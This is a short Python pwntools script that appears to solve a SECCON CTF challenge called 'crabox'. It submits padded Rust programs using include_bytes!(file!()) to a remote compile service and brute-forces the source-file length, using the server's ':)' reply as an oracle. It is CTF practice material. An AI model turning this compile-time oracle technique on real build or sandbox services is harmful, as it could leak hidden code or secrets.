from pwn import *
import re
import socket

HOST = '127.0.0.1'
PORT = 1337

# HOST = 'crabox.seccon.games'
# PORT = 1337

TEMPLATE = "const B: &[u8; 343] = include_bytes!(file!());"
def guess_prog_length(length):
    print("[+] Try: {}".format(length))

    program = ''
    program = '''
const B: &[u8; {:04}] = include_bytes!(file!());
'''.format(length)
    assert(len(program) <= 511)
    program += ' ' * (511 - len(program))
    program += '\n'
    if len(program) != 512:
        print(program)
    program += '__EOF__'

    io = remote(HOST, PORT)
    io.sendline(program)
    data = io.recvall()
    io.close()
    if b':)' in data:
        print(data)
        return True
    else:
        return False



def main():
    for i in range(559, 559+50):
        success = guess_prog_length(i)
        if success:
            print("[!] Program length: {}".format(i))
            break


if __name__ == '__main__':
    main()
